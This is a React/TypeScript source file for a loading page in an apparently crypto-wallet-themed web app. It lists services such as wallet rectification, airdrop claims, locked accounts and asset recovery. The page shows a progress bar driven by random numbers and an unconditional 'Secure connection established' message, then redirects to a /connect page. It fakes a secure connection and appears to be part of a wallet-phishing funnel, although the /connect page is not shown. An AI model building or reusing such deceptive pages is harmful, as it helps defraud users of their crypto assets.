import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Header } from "@/components/header";
import { 
  ArrowRightLeft, 
  Settings2, 
  Gift, 
  RefreshCw, 
  TrendingUp, 
  Zap,
  Layers,
  Shield,
  ArrowUpDown,
  Image,
  Lock,
  AlertTriangle,
  Clock,
  DollarSign,
  RotateCcw,
  Coins,
  ArrowLeftRight,
  Link,
  Skull,
  Trophy,
  Server,
  HelpCircle
} from "lucide-react";

const iconMap: Record<string, any> = {
  "migration": ArrowRightLeft,
  "rectification": Settings2,
  "claim": Gift,
  "swap": RefreshCw,
  "slippage": TrendingUp,
  "claim-airdrop": Zap,
  "staking": Layers,
  "whitelist": Shield,
  "cross-transfer": ArrowUpDown,
  "nfts": Image,
  "locked-account": Lock,
  "login-error": AlertTriangle,
  "transaction-delay": Clock,
  "missing-balance": DollarSign,
  "asset-recovery": RotateCcw,
  "buy-token": Coins,
  "exchange": ArrowLeftRight,
  "bridging": Link,
  "scam-token": Skull,
  "claim-reward": Trophy,
  "node-validation": Server,
  "other-issues": HelpCircle,
};

export default function LoadingPage() {
  const [, setLocation] = useLocation();
  const [progress, setProgress] = useState(0);
  
  const params = new URLSearchParams(window.location.search);
  const serviceName = params.get("service") || "SERVICE";
  const serviceIcon = params.get("icon") || "staking";
  const serviceColor = params.get("color") || "text-primary";
  const serviceBgColor = params.get("bg") || "bg-blue-600";

  useEffect(() => {
    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return prev + Math.random() * 15 + 5;
      });
    }, 200);

    const redirectTimer = setTimeout(() => {
      setLocation(`/connect?service=${encodeURIComponent(serviceName)}&icon=${serviceIcon}&color=${encodeURIComponent(serviceColor)}&bg=${encodeURIComponent(serviceBgColor)}`);
    }, 3000);

    return () => {
      clearInterval(interval);
      clearTimeout(redirectTimer);
    };
  }, [setLocation, serviceName, serviceIcon, serviceColor, serviceBgColor]);

  const displayProgress = Math.min(Math.round(progress), 100);
  const IconComponent = iconMap[serviceIcon] || Layers;

  return (
    <div className="min-h-screen bg-zinc-950">
      <Header onLaunchApp={() => {}} />
      <div className="flex items-center justify-center min-h-[calc(100vh-80px)]">
      <div className="text-center max-w-lg mx-auto px-4">
        <div className="relative mb-8 inline-block">
          <div className={`w-20 h-20 rounded-xl ${serviceBgColor} flex items-center justify-center`}>
            <IconComponent className={`w-10 h-10 ${serviceColor}`} />
          </div>
          <div className="absolute -bottom-2 -right-2 w-8 h-8 rounded-full border-4 border-zinc-950 bg-zinc-800 flex items-center justify-center">
            <div className="w-5 h-5 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" />
          </div>
        </div>
        
        <h1 className="text-2xl font-bold text-white mb-3">
          Connecting to {serviceName}
        </h1>
        <p className="text-muted-foreground mb-8">
          Please wait while we establish a secure connection...
        </p>
        
        <div className="w-full max-w-sm mx-auto mb-3">
          <div className="h-2 bg-zinc-800 rounded-full overflow-hidden">
            <div 
              className="h-full bg-blue-500 transition-all duration-200 ease-out"
              style={{ width: `${displayProgress}%` }}
            />
          </div>
        </div>
        <p className="text-muted-foreground text-sm mb-6">
          {displayProgress}% Complete
        </p>
        
        <div className="flex items-center justify-center gap-2">
          <div className="w-2 h-2 rounded-full bg-green-500" />
          <span className="text-muted-foreground text-sm">Secure connection established</span>
        </div>
      </div>
      </div>
    </div>
  );
}
